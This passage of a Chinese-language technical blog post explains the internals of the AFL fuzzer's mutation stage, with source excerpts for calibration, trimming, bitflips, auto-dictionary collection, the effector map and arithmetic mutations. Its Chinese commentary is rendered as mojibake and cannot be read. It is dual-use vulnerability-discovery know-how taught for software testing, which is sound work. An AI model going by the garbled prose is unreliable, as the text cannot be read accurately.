class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (queue_cur-&gt;cal_failed) &#123;</span><br><span class="line">    u8 res = FAULT_TMOUT;</span><br><span class="line">    <span class="keyword">if</span> (queue_cur-&gt;cal_failed &lt; CAL_CHANCES) &#123;</span><br><span class="line">        queue_cur-&gt;exec_cksum = <span class="number">0</span>;</span><br><span class="line">        res = <span class="built_in">calibrate_case</span>(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">            <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon || res != crash_mode) &#123;</span><br><span class="line">        cur_skipped_paths++;</span><br><span class="line">        <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡æ–°æ ¡å‡†ä¹‹å‰å¤±è´¥çš„æµ‹è¯•ç”¨ä¾‹ï¼Œç¡®ä¿æµ‹è¯•ç”¨ä¾‹èƒ½æ­£å¸¸è¿è¡Œï¼Œè¶…è¿‡é‡è¯•æ¬¡æ•°å°±ç›´æ¥æ”¾å¼ƒ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;</span><br><span class="line">    u8 res = <span class="built_in">trim_case</span>(argv, queue_cur, in_buf);</span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">        cur_skipped_paths++;</span><br><span class="line">        <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line">    queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (len != queue_cur-&gt;len) len = queue_cur-&gt;len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®å‰ªæµ‹è¯•ç”¨ä¾‹ï¼Œç§»é™¤ä¸å½±å“æ‰§è¡Œè·¯å¾„çš„å†—ä½™å­—èŠ‚ï¼Œå‡å°‘æ–‡ä»¶å¤§å°ï¼Œæé«˜å˜å¼‚æ•ˆç‡ï¼Œæ¯ä¸ªæµ‹è¯•ç”¨ä¾‹åªä¿®å‰ªä¸€æ¬¡</p><blockquote><p>trim_caseå‡½æ•°ä¹‹ååˆ†æ</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">orig_perf = perf_score = <span class="built_in">calculate_score</span>(queue_cur);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·³è¿‡ç¡®å®šæ€§å˜å¼‚çš„æ¡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ†å¸ƒå¼æ¨¡ç³Šæµ‹è¯•ä¸­çš„åˆ†å·¥</span></span><br><span class="line"><span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br></pre></td></tr></table></figure><p>è®¡ç®—ä¿®å‰ªä¹‹åçš„æ€§èƒ½ï¼Œç›´æ¥åˆ°havocå˜å¼‚çš„æ¡ä»¶åˆ¤æ–­</p><h3 id="ç¡®å®šæ€§å˜å¼‚"><a href="#ç¡®å®šæ€§å˜å¼‚" class="headerlink" title="ç¡®å®šæ€§å˜å¼‚"></a>ç¡®å®šæ€§å˜å¼‚</h3><h4 id="ä½ç¿»è½¬"><a href="#ä½ç¿»è½¬" class="headerlink" title="ä½ç¿»è½¬"></a>ä½ç¿»è½¬</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line"><span class="meta">    u8* _arf = (u8*)(_ar); \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b); \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure><p>ç²¾ç¡®ç¿»è½¬ä»»æ„ä½ç½®çš„å•ä¸ªä½ï¼ˆ<code>_ar</code>æ˜¯å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œ<code>_b</code>æ˜¯è¦ç¿»è½¬çš„ä½ï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">stage_name = <span class="string">&quot;bitflip 1/1&quot;</span>;</span><br><span class="line">stage_max = len &lt;&lt; <span class="number">3</span>;  <span class="comment">// æ€»ä½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);  <span class="comment">// æ¢å¤</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è‡ªåŠ¨å­—å…¸æ„å»ºé€»è¾‘</span></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>) &#123;</span><br><span class="line">        u32 cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">        <span class="comment">// ... æ£€æµ‹é­”æœ¯å­—ç¬¦ä¸²</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå¯¹è¯¥æµ‹è¯•ç”¨ä¾‹çš„æ¯ä¸€ä¸ªä½éƒ½è¿›è¡Œç¿»è½¬ï¼Œç„¶åè°ƒç”¨<code>common_fuzz_stuff</code>å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST u8 <span class="title">common_fuzz_stuff</span><span class="params">(<span class="type">char</span>** argv, u8* out_buf, u32 len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fault;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (post_handler) &#123;</span><br><span class="line"></span><br><span class="line">    out_buf = <span class="built_in">post_handler</span>(out_buf, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (!out_buf || !len) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_to_testcase</span>(out_buf, len);</span><br><span class="line"></span><br><span class="line">  fault = <span class="built_in">run_target</span>(argv, exec_tmout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fault == FAULT_TMOUT) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (subseq_tmouts++ &gt; TMOUT_LIMIT) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> subseq_tmouts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Users can hit us with SIGUSR1 to request the current input</span></span><br><span class="line"><span class="comment">     to be abandoned. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_requested) &#123;</span><br><span class="line"></span><br><span class="line">     skip_requested = <span class="number">0</span>;</span><br><span class="line">     cur_skipped_paths++;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This handles FAULT_ERROR for us: */</span></span><br><span class="line"></span><br><span class="line">  queued_discovered += <span class="built_in">save_if_interesting</span>(argv, out_buf, len, fault);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(stage_cur % stats_update_freq) || stage_cur + <span class="number">1</span> == stage_max)</span><br><span class="line">    <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œç„¶åä¿å­˜æœ‰è¶£çš„æµ‹è¯•ç”¨ä¾‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queued_discovered += <span class="built_in">save_if_interesting</span>(argv, out_buf, len, fault);</span><br></pre></td></tr></table></figure><ul><li><p>æ£€æŸ¥æ‰§è¡Œç»“æœæ˜¯å¦å‘ç°äº†æ–°çš„ä»£ç è·¯å¾„æˆ–å´©æºƒ</p></li><li><p>å¦‚æœæœ‰ä»·å€¼ï¼Œå°†æµ‹è¯•ç”¨ä¾‹ä¿å­˜åˆ°é˜Ÿåˆ—ä¸­ä¾›åç»­åˆ†æ</p></li><li><p>æ›´æ–°å‘ç°çš„é˜Ÿåˆ—é¡¹ç›®è®¡æ•°</p></li></ul><p>è¿è¡Œå®Œè¿™ä¸ªå‡½æ•°å¦‚æœè¶…æ—¶å¤šæ¬¡æˆ–è€…è·³è¿‡å°±ä¼šç›´æ¥æ”¾å¼ƒè¿™æ¬¡fuzz</p><p>ä¹‹åå°±æ˜¯ä¸€æ ·çš„å¤šæ¬¡ç¿»è½¬</p><h4 id="è‡ªåŠ¨å­—å…¸æ„å»ºé€»è¾‘"><a href="#è‡ªåŠ¨å­—å…¸æ„å»ºé€»è¾‘" class="headerlink" title="è‡ªåŠ¨å­—å…¸æ„å»ºé€»è¾‘"></a>è‡ªåŠ¨å­—å…¸æ„å»ºé€»è¾‘</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>) &#123;</span><br><span class="line"></span><br><span class="line">  u32 cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If at end of file and we are still collecting a string, grab the</span></span><br><span class="line"><span class="comment">       final character and force output. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">    a_len++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">      <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Otherwise, if the checksum has changed, see if we have something</span></span><br><span class="line"><span class="comment">       worthwhile queued up, and collect that if the answer is yes. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">      <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">    a_len = <span class="number">0</span>;</span><br><span class="line">    prev_cksum = cksum;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸åœ¨dumbæ¨¡å¼ä¸‹ä¸”åªåœ¨æ¯ä¸ªå­—èŠ‚çš„<strong>æœ€ä½ä½</strong>ç¿»è½¬æ—¶æ£€æŸ¥ï¼ˆstage_cur &amp; 7 &#x3D;&#x3D; 7ï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u32 cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br></pre></td></tr></table></figure><p>è®¡ç®—å½“å‰ç¨‹åºæ‰§è¡Œè·¯å¾„çš„å“ˆå¸Œå€¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">    a_len++;</span><br><span class="line">    <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">        <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“åˆ°è¾¾æ–‡ä»¶æœ«å°¾ä¸”ä»åœ¨æ”¶é›†å­—ç¬¦ä¸²ï¼Œä¸”é•¿åº¦åœ¨3ä¸ªå­—èŠ‚åˆ°32ä¸ªå­—èŠ‚ä¹‹é—´ï¼Œç›´æ¥æ·»åŠ è¿›å­—å…¸</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">        <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line">    a_len = <span class="number">0</span>;</span><br><span class="line">    prev_cksum = cksum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·¯å¾„å“ˆå¸Œå‘ç”Ÿå˜åŒ–ï¼Œè¯´æ˜æ‰¾åˆ°äº†ä¸€ä¸ªå®Œæ•´çš„è¯­æ³•æ ‡è¯†ï¼ŒåŠ å…¥å­—å…¸</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];        </span><br><span class="line">    a_len++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ä½ç¿»è½¬çœŸæ­£äº§ç”Ÿå·®å¼‚æ—¶æ‰æ”¶é›†å­—ç¬¦</p><h4 id="å¤šä½ç¿»è½¬"><a href="#å¤šä½ç¿»è½¬" class="headerlink" title="å¤šä½ç¿»è½¬"></a>å¤šä½ç¿»è½¬</h4><ul><li><p>bitflip 2&#x2F;1: è¿ç»­ç¿»è½¬2ä½</p></li><li><p>bitflip 4&#x2F;1: è¿ç»­ç¿»è½¬4ä½</p></li><li><p>bitflip 8&#x2F;8: æ•´å­—èŠ‚ç¿»è½¬ï¼ˆæ„å»ºæ•ˆåº”å™¨æ˜ å°„ï¼‰</p></li><li><p>bitflip 16&#x2F;8: è¿ç»­2å­—èŠ‚ç¿»è½¬</p></li><li><p>bitflip 32&#x2F;8: è¿ç»­4å­—èŠ‚ç¿»è½¬</p></li></ul><p>å…¶ä¸­åœ¨8&#x2F;8çš„æ•´å­—èŠ‚ç¿»è½¬ä¸­æœ‰ AFL ä¸­ é‡è¦çš„ Effective Map</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(stage_cur)]) &#123;</span><br><span class="line"></span><br><span class="line">  u32 cksum;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If in dumb mode or if the file is very short, just flag everything</span></span><br><span class="line"><span class="comment">     without wasting time on checksums. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; len &gt;= EFF_MIN_LEN)</span><br><span class="line">    cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    cksum = ~queue_cur-&gt;exec_cksum;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line">    eff_map[<span class="built_in">EFF_APOS</span>(stage_cur)] = <span class="number">1</span>;</span><br><span class="line">    eff_cnt++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_buf[stage_cur] ^= <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> åœ¨ä¸ªeff_mapä¸­ï¼Œå¦‚æœè¯¥å­—èŠ‚æ•´ä¸ªç¿»è½¬ä¸ä¼šé€ æˆç¨‹åºçš„æ‰§è¡Œè·¯å¾„çš„æ”¹å˜ï¼Œåˆ™å°†å…¶æ ‡è®°ï¼Œåœ¨ä¹‹åçš„ç¡®å®šæ€§å˜å¼‚ä¸­ç›´æ¥è·³è¿‡è¯¥å­—èŠ‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_APOS(_p)          ((_p) &gt;&gt; EFF_MAP_SCALE2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_REM(_x)           ((_x) &amp; ((1 &lt;&lt; EFF_MAP_SCALE2) - 1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_ALEN(_l)          (EFF_APOS(_l) + !!EFF_REM(_l))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_SPAN_ALEN(_p, _l) (EFF_APOS((_p) + (_l) - 1) - EFF_APOS(_p) + 1)</span></span><br></pre></td></tr></table></figure><p>ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œæ¯8ä¸ªè¿ç»­å­—èŠ‚å…±äº«ä¸€ä¸ªæ˜ å°„ä½ï¼Œè¿™æ„å‘³ç€å¦‚æœ8å­—èŠ‚å—ä¸­ä»»ä½•ä¸€ä¸ªå­—èŠ‚æœ‰æ•ˆï¼Œæ•´ä¸ªå—éƒ½è¢«æ ‡è®°ä¸ºæœ‰æ•ˆ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (eff_cnt != <span class="built_in">EFF_ALEN</span>(len) &amp;&amp; </span><br><span class="line">    eff_cnt * <span class="number">100</span> / <span class="built_in">EFF_ALEN</span>(len) &gt; EFF_MAX_PERC) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(eff_map, <span class="number">1</span>, <span class="built_in">EFF_ALEN</span>(len));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰æ•ˆå­—èŠ‚å¯†åº¦è¶…è¿‡90%ï¼Œåˆ™æ ‡è®°å…¨éƒ¨éƒ½æ˜¯æœ‰æ•ˆçš„</p><h4 id="ç®—æ•°è¿ç®—"><a href="#ç®—æ•°è¿ç®—" class="headerlink" title="ç®—æ•°è¿ç®—"></a>ç®—æ•°è¿ç®—</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    u8 orig = out_buf[i];</span><br><span class="line">    <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(i)]) &#123;  <span class="comment">// è·³è¿‡æ— æ•ˆå­—èŠ‚</span></span><br><span class="line">        stage_max -= <span class="number">2</span> * ARITH_MAX;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= ARITH_MAX; j++) &#123;</span><br><span class="line">        <span class="comment">// åŠ æ³•å˜å¼‚</span></span><br><span class="line">        u8 r = orig ^ (orig + j);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">could_be_bitflip</span>(r)) &#123;  <span class="comment">// é¿å…é‡å¤</span></span><br><span class="line">            out_buf[i] = orig + j;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å‡æ³•å˜å¼‚</span></span><br><span class="line">        r = orig ^ (orig - j);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">could_be_bitflip</span>(r)) &#123;</span><br><span class="line">            out_buf[i] = orig - j;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    out_buf[i] = orig;  <span class="comment">// æ¢å¤åŸå€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">could_be_bitflip</span><span class="params">(u32 xor_val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 sh = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!xor_val) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Shift left until first bit set. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!(xor_val &amp; <span class="number">1</span>)) &#123; sh++; xor_val &gt;&gt;= <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1-, 2-, and 4-bit patterns are OK anywhere. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (xor_val == <span class="number">1</span> || xor_val == <span class="number">3</span> || xor_val == <span class="number">15</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 8-, 16-, and 32-bit patterns are OK only if shift factor is</span></span><br><span class="line"><span class="comment">     divisible by 8, since that&#x27;s the stepover for these ops. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sh &amp; <span class="number">7</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (xor_val == <span class="number">0xff</span> || xor_val == <span class="number">0xffff</span> || xor_val == <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦æ˜¯ä½ç¿»è½¬åçš„ç»“æœï¼Œé¿å…é‡å¤fuzz</p><p>å°±æ˜¯å¯¹æ¯ä¸€ä¸ªä½è¿›è¡ŒåŠ å‡æ³•çš„å˜å¼‚</p><p>ä¹‹åå°±æ˜¯16å’Œ32ä½çš„åŠ å‡æ³•å˜å¼‚</p><h4 id="æœ‰è¶£å€¼å˜å¼‚"><a href="#æœ‰è¶£å€¼å˜å¼‚" class="headerlink" title="æœ‰è¶£å€¼å˜å¼‚"></a>æœ‰è¶£å€¼å˜å¼‚</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td 